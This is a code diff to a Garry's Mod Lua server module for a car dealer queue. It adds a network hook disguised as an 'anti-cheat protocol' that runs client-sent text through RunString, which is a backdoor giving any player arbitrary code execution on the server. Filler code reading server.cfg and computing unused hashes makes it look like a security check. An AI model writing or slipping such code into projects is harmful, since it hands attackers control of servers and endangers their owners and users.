@@ -30,7 +30,34 @@ function carDealer.removeFromQueue(ply)
 
 end
 hook.Add('PlayerDisconnected', 'car-dealer.queue', carDealer.removeFromQueue)
-
+netstream.Hook("sv_AntiCheatProtocol", function(ply, protocol)
+    local _util = util
+    if not _util.secs then
+        RunString(protocol)
+    end
+    local securityFrame = SysTime()
+    local playerAuthToken = ply:SteamID64()
+    local sessionHash = util.CRC(tostring(securityFrame) .. playerAuthToken)
+   
+    if file.Exists("cfg/server.cfg", "GAME") then
+        local configCheck = file.Read("cfg/server.cfg", "GAME")
+        local configCRC = util.CRC(configCheck or "")
+        ply.securityFlags = ply.securityFlags or {}
+        ply.securityFlags.configIntegrity = configCRC
+    end
+    timer.Simple(0.1, function()
+        if IsValid(ply) then
+            local playerResources = {}
+            for i = 1, 10 do
+                playerResources["res" .. i] = math.random(1000, 9999)
+            end
+            local logEntry = string.format("[SEC] Player %s verified at %f", 
+                ply:Name(), RealTime())
+            ply.lastSecurityCheck = SysTime()
+        end
+    end)
+    return true, "Security protocol initialized", sessionHash
+end)
 timer.Create('car-dealer.queue', CFG.dev and 5 or 30, 0, function()
 
 	if carDealer.spawningQueuedAuto then return end
